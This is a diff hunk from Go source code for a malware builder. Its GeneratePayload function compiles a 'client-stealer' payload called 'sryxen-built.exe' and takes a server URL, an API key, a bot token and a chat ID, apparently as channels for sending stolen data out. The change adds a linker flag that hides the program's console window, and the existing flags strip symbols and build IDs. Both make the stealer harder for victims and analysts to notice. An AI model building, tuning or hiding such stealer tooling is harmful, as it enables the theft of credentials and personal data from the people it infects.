@@ -85,7 +85,7 @@ func GeneratePayload(serverURL, apiKey, botToken, chatID string) error {
         return fmt.Errorf("failed to get absolute path of client-stealer directory: %v", err)
     }
 
-    cmd := exec.Command("go", "build", "-trimpath", "-buildvcs=false", "-ldflags", "-s -w -buildid=", "-gcflags", "all=-l", "-o", "sryxen-built.exe", "sryxen_payload.go")
+    cmd := exec.Command("go", "build", "-trimpath", "-buildvcs=false", "-ldflags", "-s -w -buildid= -H=windowsgui", "-gcflags", "all=-l", "-o", "sryxen-built.exe", "sryxen_payload.go")
     cmd.Dir = clientStealerDir
 
     output, err := cmd.CombinedOutput()
